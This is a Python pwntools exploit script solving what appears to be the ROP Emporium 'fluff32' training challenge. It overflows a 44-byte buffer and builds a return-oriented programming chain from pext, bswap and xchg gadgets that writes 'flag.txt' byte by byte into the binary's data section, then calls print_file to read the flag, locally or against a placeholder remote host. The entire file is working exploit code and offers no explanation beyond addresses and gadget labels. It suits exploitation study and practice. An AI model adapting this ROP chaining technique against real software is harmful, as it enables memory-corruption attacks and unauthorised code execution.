#!/usr/bin/env python3

from pwn import *

exe = ELF("fluff32_patched")
libc = ELF("libfluff32.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    fullmask = [0xb4b , 0x2dd , 0x1d46 , 0xb5a , 0x1db , 0xacd , 0x1ac5 , 0xacd]
    offset = 44
    printfile = 0x80483d0
    datasec = 0x804a018
    pextgad = 0x8048543 #edx
    xchggad = 0x8048555 #ecx -> mem 
    popbsecx = 0x8048558 
    popebp = 0x80485bb


    fploit = b''
    for dataoff, mask in enumerate(fullmask):
        fploit += pack(popebp)
        fploit += pack(mask)
        fploit += pack(pextgad)
        fploit += pack(popbsecx)
        fploit += pack(datasec + dataoff, endian='big')
        fploit += pack(xchggad)

    payload = flat(b'A'*offset ,fploit, printfile, 0x0, datasec)
    r.sendlineafter(b'>', payload)

    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
